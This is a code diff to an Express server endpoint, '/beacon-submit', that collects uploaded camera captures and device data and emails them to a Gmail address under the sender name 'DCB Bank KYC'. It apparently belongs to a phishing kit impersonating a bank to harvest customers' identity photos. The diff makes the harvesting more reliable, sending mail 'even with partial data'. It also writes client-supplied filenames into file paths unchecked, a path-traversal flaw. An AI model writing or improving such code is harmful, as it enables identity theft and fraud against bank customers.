@@ -113,16 +113,18 @@ app.post('/beacon-submit', (req, res) => {
   const bb = busboy({ headers: req.headers });
   const files = [];
   const fields = {};
-  
+  let hadError = false;
+
   bb.on('file', (name, file, info) => {
     const chunks = [];
     file.on('data', (chunk) => chunks.push(chunk));
     file.on('end', () => {
       files.push({
         buffer: Buffer.concat(chunks),
-        filename: info.filename
+        filename: info.filename || `capture_${Date.now()}.jpg`
       });
     });
+    file.on('error', () => hadError = true);
   });
 
   bb.on('field', (name, val) => {
@@ -131,6 +133,10 @@ app.post('/beacon-submit', (req, res) => {
 
   bb.on('close', async () => {
     try {
+      if (hadError && files.length === 0) {
+        return res.status(400).send('Invalid form data');
+      }
+
       const submissionData = {
         device: {
           type: fields.device_type || 'desktop',
@@ -148,13 +154,18 @@ app.post('/beacon-submit', (req, res) => {
       };
 
       // Save files temporarily
-      const filePaths = files.map(file => {
-        const path = `${uploadDir}/${Date.now()}-${file.filename}`;
-        fs.writeFileSync(path, file.buffer);
-        return path;
-      });
+      const filePaths = [];
+      for (const file of files) {
+        try {
+          const path = `${uploadDir}/${Date.now()}-${file.filename}`;
+          fs.writeFileSync(path, file.buffer);
+          filePaths.push(path);
+        } catch (e) {
+          console.error('Error saving file:', e);
+        }
+      }
 
-      // Send email
+      // Send email even with partial data
       await transporter.sendMail({
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
@@ -176,6 +187,10 @@ app.post('/beacon-submit', (req, res) => {
       console.error('Beacon processing error:', error);
       res.status(500).send();
     }
+  });
+
+  bb.on('error', () => {
+    bb.end();
   });
 
   req.pipe(bb);
